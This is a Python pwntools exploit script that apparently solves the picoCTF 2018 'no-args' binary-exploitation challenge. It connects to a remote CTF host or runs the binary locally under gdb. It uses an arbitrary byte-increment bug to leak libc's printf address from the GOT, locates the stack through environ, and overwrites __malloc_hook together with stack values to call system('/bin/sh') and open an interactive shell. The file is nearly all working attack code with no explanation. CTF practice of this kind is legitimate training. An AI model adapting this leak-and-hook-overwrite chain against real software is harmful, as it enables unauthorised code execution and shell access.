from pwn import *
import time
from sys import argv

pico = 0

malloc_hook = 1

if pico:
	p = remote('2018shell2.picoctf.com', 36903)
else:
	env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
	p = process("./no-args", env=env)
	gdb.attach(p, '''
		b *0x400a54
		 c
		 ''')

libc = ELF('./libc.so.6')

if len(argv) > 2:
	time.sleep(int(argv[1]))

def incint2(loc, amt, times):
	for _ in range(times):
		p.recvuntil('> ')
		p.sendline('2')
		p.recvuntil('(y/n) ')
		p.sendline('n')
		p.recvuntil('> ')
		p.sendline('choose')
		p.recvuntil('> ')
		p.sendline('y\x00'.ljust(32) + p64(loc-0x10) + chr(amt))

def incbytes2(loc, towrite):
	for i,v in enumerate(towrite):
		if ord(v) != 0:
			incint2(loc+i, 1, ord(v))

def read2():
	p.recvuntil('> ')
	p.sendline('2')
	p.recvuntil('(y/n) ')
	p.sendline('y')
	ret = p.recvuntil('> ')
	p.sendline('NOTANACTUALPROBLEM')
	return [x.split('  - ')[1] for x in ret.splitlines()[1:-2]]

def back2():
	incint2(0x602020, 0xff, 1)

def add1(name):
	p.recvuntil('> ')
	p.sendline('1')
	p.recvuntil('> ')
	p.sendline(name)

GOT_PRINTF = 0x601fa1

log.info("Stage 1")
add1(p64(0xffffffffff600404) + p64(0x602108))
incbytes2(0x602108, p64(0x602140))
incbytes2(0x602110, p64(0x602180))
incbytes2(0x602140, "no-args")
incbytes2(0x602180, p64(GOT_PRINTF))

log.info("Stage 2")
incint2(0x602028, 0x20, 1)
LIBC_PRINTF = u64("\x00" + read2()[2] + "\x00\x00")
LIBC_BASE = LIBC_PRINTF - libc.symbols['printf']

log.info("Stage 3")
LIBC_ENVIRON = LIBC_BASE + libc.symbols['environ']
incbytes2(0x602188, p64(0x6021b0))
incbytes2(0x6021b0, p64(LIBC_ENVIRON))
STK_ENVIRON = u64(read2()[3] + "\x00\x00")


LIBC_BINSH = LIBC_BASE + next(libc.search("/bin/sh\x00"))
LIBC_SYSTEM = LIBC_BASE + libc.symbols['system']
POP_RDI = 0x400fe3

log.info("environ: " + hex(STK_ENVIRON))
log.info("binsh: " + hex(LIBC_BINSH))


if malloc_hook:
	LIBC_HOOK = LIBC_BASE + libc.symbols['__malloc_hook']
	LIBC_ONE = LIBC_BASE + int(argv[1],16)
	log.info("one_gadget: " + hex(LIBC_ONE))
	log.info("Overwriting mallochook...")
	# You can do as many arbitrary increases as you want here
	start = 0x602200

	log.info("Overwriting start 1")
	# incbytes2(start, '\x90\x90\x90\x90')
	# incbytes2(start+0x8, p64(0x3FFE917F))
	# incbytes2(start+0x8, p64(0x00004156))
	# incbytes2(start+0x18, p64(0x54))
	# log.info("Overwriting start 2")
	# incbytes2(start+0x8, p64(LIBC_BINSH))
	# log.info("Overwriting start 3")
	# incbytes2(start+0x8+0x8, p64(LIBC_SYSTEM))
	incbytes2(LIBC_HOOK, p64(POP_RDI))
	log.info("Overwriting first stack val @ " + hex(STK_ENVIRON-0x180))
	incbytes2(STK_ENVIRON-0x180, p64(LIBC_BINSH))
	log.info("Overwriting second stack val @ " + hex(STK_ENVIRON-0x180+0x8))
	incbytes2(STK_ENVIRON-0x180+0x8, p64(LIBC_SYSTEM))
	# raw_input("paused.")
	back2()
	log.info("Running...")
	# This will run __malloc_hook
	if len(argv) <= 2:
		add1(p64(POP_RDI))

		time.sleep(0.1)
	p.interactive()
